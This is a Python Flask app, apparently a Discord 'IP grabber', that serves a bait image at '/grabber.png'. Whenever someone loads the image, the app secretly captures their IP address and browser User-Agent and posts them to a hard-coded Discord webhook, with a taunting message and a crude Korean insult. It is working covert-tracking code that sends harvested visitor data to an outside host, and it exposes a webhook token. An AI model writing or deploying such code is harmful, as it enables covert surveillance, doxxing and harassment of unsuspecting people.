from flask import Flask, request, send_file, render_template_string
from datetime import datetime
import requests
import threading
import os

app = Flask(__name__)
WEBHOOK = "https://discord.com/api/webhooks/1446892630742143006/hrJrXFhVtRFXyPOstS6wi4jguM1iR-pT8874cRhJ4D8z_pnxdwOR0zScrjUSceR8s4EJ"

def send(ip, ua):
    payload = {
        "content": "또 걸렸죠~",
        "username": "IP 그래버",
        "embeds": [{
            "title": "딱대 애미븅신고아들",
            "description": f"**IP:** `{ip}`\n**UA:** `{ua}`",
            "color": 16711680,
            "timestamp": datetime.now().isoformat()
        }]
    }
    threading.Thread(target=requests.post, args=(WEBHOOK,), kwargs={"json": payload}).start()

@app.route('/')
def index():
    return render_template_string(open("index.html").read())

@app.route('/grabber.png')
def grab():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip: ip = ip.split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    send(ip, ua)
    return send_file("grabber.png", mimetype='image/png')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
